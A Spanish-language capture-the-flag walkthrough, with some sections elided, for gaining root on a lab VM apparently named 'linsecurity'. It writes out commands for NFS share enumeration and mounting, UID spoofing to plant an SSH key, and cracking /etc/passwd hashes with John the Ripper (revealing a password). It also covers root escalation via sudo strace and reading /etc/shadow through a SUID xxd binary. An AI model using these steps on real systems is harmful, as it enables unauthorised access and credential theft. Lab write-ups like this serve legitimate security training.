...
primero investigo algunos comandos de nfs y veo un comando interesante de nombre "showmount"
Ese comando "showmount" tiene una estructura interesante y esta:

$ showmount [ -ade ] [ host ]

El comando "showmount" tiene esta descripción de cada opcion:
...
entonces pruebo con cada uno de esta manera:

$ showmount -a 192.168.0.22 -> “All mount points on 192.168.0.22:”
      $ showmount -d 192.168.0.22 -> “Directories on 192.168.0.22:”

Pero el unico que arrojo un resultado interesante es la opcion "-e"

$ showmount -e 192.168.0.22 -> Export list for 192.168.0.22: /home/peter *

luego voy a montar ese directorio de esta manera:

$ mount -t nfs 192.168.0.22:/home/peter linsec
o
$ mount -t nfs 192.168.0.22:/home/peter linsec -o nolock

pero antes en la carpeta de “/home” creamos una carpeta de nombre "linsec"
Luego le cambio el UID a mi usuario mrandrew por el UID 1001, esto es con el fin de que investigue en google y el UID de la maquina victima tiene que ser igual al usuario que tengo en mi maquina de Kali con el fin de que las llaves ssh tengan compatibilidad y es de esta manera:

$ usermod -u 1001 mrandrew
   
Una vez cambiado el UID ingreso a mi usuario mrandrew y creo una llave ssh así:

$ ssh-keygen -t rsa -b 2048

luego entro a la carpeta “/root/linsec” y creo una carpeta de nombre “.ssh”
Ahora solo me queda copiar esa clave ssh que cree en un archivo de nombre "authorized_keys" y lo pego dentro de la carpeta “.ssh” de “linsec” de esta manera:

$ cp /home/mrandrew/.ssh/id_rsa.pub authorized_keys

una vez copiado el archivo dentro de la ruta:

mrandrew@kali:/root/linsec/.ssh$

podemos ingresar por medio de ssh con el usuario "peter" así:

        $ ssh peter@192.168.0.22

Entonces lo que hago es coger todo el contenido de “etc/passwd” y lo guardo en un archivo dentro de mi maquina kali, esto es con el obetivo de decifrar el HASH ya que hay un usuario que se llama “linsecurity” que tiene un UID y GUID como usuario "root"
Ahora para decifrar ese HASH usare “John de ripper” y es así:

        $ john --wordlist=/root/rockyou.txt hashlinsec

Como resultado sale que el usuario “linsecurity” tiene la password “P@ssw0rd”
Entonces en la sesion “ssh” con el usuario "peter" ingreso a ese usuario de esta manera:

$ su linsecurity

Y ya tendria permisos root


>Segunda forma de usar John de ripper

Hay otra forma de usar “John de ripper” y esta:
...
El usuario “peter” puede ejecutar “/usr/bin/strace”
Con eso podemos escribir un script para levantar privilegios y es con lenguaje C que se llame por ejemplo “root.c” y es asì:
...
Luego lo debemos de compilar de esta manera:

$ gcc root.c -o root.out

Ahora para ejecutarlo es de esta manera:

$ sudo strace ./root.out 2>/dev/null

Y ya con esto ingresamos como root

>Tercera forma de elevar privilegios

otra forma es colocar esto:

find / -type f -user root -perm /u+s -ls 2>/dev/null | grep -v snap

Si el resultado de la intrucción del paso 1 es esto:

-rwsr-x--- root itservices /usr/bin/xxd

podemos estonces ejecutar esto:

$ xxd -p /etc/shadow | xxd -p -r

El comando del paso 4  lo anterior nos permite ver los hashes de del archivo “/etc/shadow”
Solo quedaria decifrarlos con “john the ripper” asì:
